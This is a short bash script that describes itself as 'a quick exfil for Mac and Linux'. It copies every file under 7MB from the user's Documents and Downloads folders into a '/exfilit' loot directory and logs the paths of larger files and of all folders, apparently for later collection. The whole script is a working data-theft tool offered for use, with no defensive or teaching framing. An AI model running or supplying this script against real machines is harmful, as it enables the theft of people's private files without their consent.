#!/bin/bash
# 
# Description: A quick exfil for Mac and Linux.
# Exports files under 7MB to disk and logs filesystem. 
# Mod file size as needed 

LOOT_DIR="/exfilit"
SUB_DIR="$LOOT_DIR/files"
SRC_DOC="$HOME/Documents"
SRC_DOWN="$HOME/Downloads"

mkdir -p $LOOT_DIR
mkdir -p $SUB_DIR
touch $LOOT_DIR/large_files.txt
touch $LOOT_DIR/folders.txt

# Loop through all files in the source directories
for SRC_DIR in "$SRC_DOC" "$SRC_DOWN"; do
    find "$SRC_DIR" -type f | while read file; do
        size=$(du -B1 "$file" | awk '{print $1}')
        if [ $size -lt 7000000 ]; then
            cp "$file" "$LOOT_DIR"/"files"
        else
            echo "$file" >> "$LOOT_DIR/large_files.txt"
        fi
    done
    find "$SRC_DIR" -type d | while read file; do
        echo "$file" >> "$LOOT_DIR/folders.txt"
    done
done
